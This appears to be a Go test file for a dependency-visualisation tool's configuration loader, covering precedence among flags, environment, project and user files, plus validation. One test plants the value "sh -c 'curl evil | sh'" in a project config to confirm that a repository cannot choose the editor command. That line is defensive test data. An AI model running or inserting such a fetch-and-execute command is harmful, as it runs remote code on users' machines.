package config

import (
	"io"
	"os"
	"path/filepath"
	"testing"
)

func write(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestPrecedence(t *testing.T) {
	root, user := t.TempDir(), t.TempDir()
	write(t, filepath.Join(user, "config.yaml"), "addr: 127.0.0.1:1\nui:\n  theme: dark\n  color_by: size\n  height_scale: log\n")
	write(t, filepath.Join(root, ProjectFile), "addr: 127.0.0.1:2\nui:\n  theme: light\n")
	env := map[string]string{"DEPPHUNTER_ADDR": "127.0.0.1:3", "DEPPHUNTER_EXCLUDE": "*.gen.go"}

	cfg, err := Load([]string{"--height-scale", "linear", "--exclude", "testdata", root}, func(k string) string { return env[k] }, user, io.Discard)
	if err != nil {
		t.Fatal(err)
	}
	checks := []struct{ name, got, want string }{
		{"addr (env beats project and user)", cfg.Addr, "127.0.0.1:3"},
		{"theme (project beats user)", cfg.UI.Theme, "light"},
		{"color_by (user beats default)", cfg.UI.ColorBy, "size"},
		{"height_scale (flag beats user)", cfg.UI.HeightScale, "linear"},
		{"root", cfg.Root, root},
	}
	for _, c := range checks {
		if c.got != c.want {
			t.Errorf("%s: got %q, want %q", c.name, c.got, c.want)
		}
	}
	if len(cfg.Exclude) != 2 || cfg.Exclude[0] != "*.gen.go" || cfg.Exclude[1] != "testdata" {
		t.Errorf("exclude: got %v", cfg.Exclude)
	}
}

func TestUnsetFlagsDoNotOverrideFiles(t *testing.T) {
	root := t.TempDir()
	write(t, filepath.Join(root, ProjectFile), "open: false\nui:\n  show_std: true\n  expand_depth: 3\n")
	cfg, err := Load([]string{root}, func(string) string { return "" }, "", io.Discard)
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Open || !cfg.UI.ShowStd || cfg.UI.ExpandDepth != 3 {
		t.Errorf("file values lost: %+v", cfg)
	}
}

func TestExplicitConfigMustExist(t *testing.T) {
	_, err := Load([]string{"--config", filepath.Join(t.TempDir(), "missing.yaml"), t.TempDir()}, func(string) string { return "" }, "", io.Discard)
	if err == nil {
		t.Fatal("expected an error for a missing --config file")
	}
}

func TestValidation(t *testing.T) {
	_, err := Load([]string{"--theme", "neon", t.TempDir()}, func(string) string { return "" }, "", io.Discard)
	if err == nil {
		t.Fatal("expected invalid theme to be rejected")
	}
}

func TestWatchCacheEditorAndExport(t *testing.T) {
	root := t.TempDir()
	write(t, filepath.Join(root, ProjectFile), "watch: true\n")
	env := map[string]string{"DEPPHUNTER_CACHE": "false", "DEPPHUNTER_EDITOR": "subl {file}:{line}"}
	cfg, err := Load([]string{"--export", "dot", "-o", "g.dot", root}, func(k string) string { return env[k] }, "", io.Discard)
	if err != nil {
		t.Fatal(err)
	}
	if !cfg.Watch || cfg.Cache || cfg.Editor != "subl {file}:{line}" || cfg.Export != "dot" || cfg.Output != "g.dot" {
		t.Errorf("unexpected config: %+v", cfg)
	}
	if _, err := Load([]string{"--export", "svg", root}, func(string) string { return "" }, "", io.Discard); err == nil {
		t.Error("unknown export format accepted")
	}
	if _, err := Load([]string{"-o", "x", root}, func(string) string { return "" }, "", io.Discard); err == nil {
		t.Error("-o without --export accepted")
	}
}

func TestProjectConfigCannotChooseEditor(t *testing.T) {
	root, user := t.TempDir(), t.TempDir()
	write(t, filepath.Join(user, "config.yaml"), "editor: code -g {file}:{line}\n")
	write(t, filepath.Join(root, ProjectFile), "editor: sh -c 'curl evil | sh' {file}\n")
	cfg, err := Load([]string{root}, func(string) string { return "" }, user, io.Discard)
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Editor != "code -g {file}:{line}" {
		t.Errorf("project config set editor to %q", cfg.Editor)
	}
}
